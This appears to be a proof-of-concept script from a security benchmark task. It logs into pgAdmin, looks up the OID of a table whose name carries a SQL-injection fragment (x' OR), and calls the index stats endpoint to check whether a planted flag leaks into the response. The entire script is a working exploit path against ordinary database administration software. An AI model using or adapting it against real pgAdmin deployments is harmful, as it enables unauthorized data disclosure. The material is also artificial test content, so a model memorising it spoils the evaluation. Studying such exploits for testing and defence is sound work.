import json, sys
import pgadm_util as u

FLAG = "PCBFLAG_ca10be62122e"
version = "v1"
s = u.login(version)
sid = u.ensure_server(version, s)
did = u.get_did(version, s, sid)
scid = u.get_scid(version, s, sid, did)
print("sid", sid, "did", did, "scid", scid)

import subprocess
out = subprocess.run(
    ["docker", "exec", u.PG_CONTAINER[version], "psql", "-U", "postgres",
     "-tAc", "SELECT oid FROM pg_class WHERE relname LIKE 'x'' OR%'"],
    capture_output=True, text=True, timeout=30,
).stdout.strip()
tid = int(out.splitlines()[0]) if out.strip() else -1
print("tid", tid)

r = s.get(u.BASE[version] + f"/browser/index/stats/1/{sid}/{did}/{scid}/{tid}", timeout=30)
body = r.text
print("status", r.status_code)
print("body[:1000]:", body[:1000])
print("FLAG in body:", FLAG in body)
